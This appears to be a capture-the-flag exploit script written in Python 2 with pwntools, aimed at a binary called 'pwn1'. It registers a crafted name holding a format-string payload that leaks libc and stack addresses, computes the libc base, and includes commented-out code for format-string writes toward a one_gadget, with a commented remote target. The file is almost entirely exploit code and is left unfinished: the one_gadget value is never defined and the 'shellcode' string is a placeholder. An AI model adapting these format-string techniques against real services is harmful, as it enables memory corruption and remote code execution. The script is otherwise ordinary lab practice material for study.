# -*- coding: utf-8 -*-

from pwn import *

def select(choice):
    io.sendlineafter("Your choice:", str(choice))

def register(name, cardid):
    select(1)
    io.sendlineafter("Input your name:", name)
    io.sendlineafter("card:", cardid)

def login(name, cardid):
    select(2)
    io.sendafter("name:", name)
    io.sendafter("Last six numbers of your ID card:", cardid)

def resetid(cookie, newid):
    select(3)
    io.sendlineafter("number?\n", 'y\x00\x00\x00')
    io.sendlineafter("cookie:\n", str(cookie))
    io.recvuntil("Your name:\n")
    s = io.recvuntil("\nYour", drop=True)
    io.sendlineafter("new ID number:\n", newid)
    return s

def logout():
    select(4)

io = process("./pwn1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# io = remote("192.168.30.24", 20001)
# libc = ELF("./libc.so.6")
context.log_level='debug'
context.terminal = ['tmux', "splitw", '-h']

name = '%17$p...%15$p\x00'
cardid = '1' * 0x20 + p64(0x602038)
io.sendlineafter("Input your name:\n", name)
io.sendlineafter("Input the last six numbers of your ID card:", cardid)

s = resetid(0x602038, p64(0x602038)).strip()

libc_main_addr = int(s[:s.find('...')], 16) - 240
stack_addr = int(s[s.find('...')+3:], 16)

libc.address = libc_main_addr - libc.sym["__libc_start_main"]
print hex(libc.address)
print hex(stack_addr)


already = 0
def count(num):
    global already
    res = (num - already) & 0xffff
    already += res
    already &= 0xffff
    return res
def getword(data, idx):
    return (data >> (idx * 16)) & 0xffff

pos = stack_addr & 0xff

# name = "%17$*c%" + num + "c%n"

# for k in range(3):
#     name = ''
#     for i in range(3):
#         name += '%' + str(count(pos)) + "c%9$hhn"
#         name += "%" + str(count(getword(0x602038, i))) + "c%9$hn"
#         pos += 2
#     name += "%" + str(count(getword(one_gadget, k))) + "c%15$hn"
#     print name
#     print len(name)

gdb.attach(io, "b * 0x400D15")

logout()
cardid = 'shellcodeaaaaaaaaaa'
register(name, cardid[:0x20])
login(name, cardid)
s = resetid(0x602038, p64(0x602038)).strip()

io.interactive()

